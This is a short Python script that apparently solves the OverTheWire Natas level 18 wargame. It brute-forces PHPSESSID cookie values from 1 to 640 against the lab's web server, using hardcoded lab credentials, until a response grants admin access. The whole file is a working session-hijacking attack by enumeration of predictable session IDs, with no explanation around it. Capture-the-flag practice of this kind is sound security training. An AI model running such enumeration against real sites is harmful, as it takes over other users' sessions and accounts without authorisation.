import requests
from requests.sessions import Session

target = 'http://natas18.natas.labs.overthewire.org'
auth = ('natas18', '8NEDUUxg8kFgPV84uLwvZkGn6okJQ6aq')
cookies = dict()

session = requests.Session()

max_s_id = 640
s_id = 1
while s_id <= max_s_id:
    print("Trying with PHPSESSID = " + str(s_id))
    cookies = dict(PHPSESSID=str(s_id))
    r = session.get(target, auth=auth, cookies=cookies)
    if "You are an admin" in r.text:
        print(r.text)
        break
    s_id += 1
